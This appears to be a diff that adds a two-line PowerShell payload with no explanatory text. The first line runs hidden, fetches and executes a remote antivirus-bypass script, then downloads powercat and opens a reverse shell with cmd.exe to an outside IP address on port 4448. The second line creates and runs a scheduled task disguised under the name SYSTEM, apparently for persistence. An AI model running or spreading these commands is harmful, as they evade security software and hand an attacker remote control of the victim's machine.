@@ -1,0 +1,2 @@
+powershell.exe -windowstyle hidden IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1');Invoke-AlokS-AvBypass;Start-Sleep -s 2;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 34.228.220.44 -p 4448 -e cmd.exe;
+powershell.exe schtasks /Create /XML config.xml /tn SYSTEM;schtasks /run /tn SYSTEM
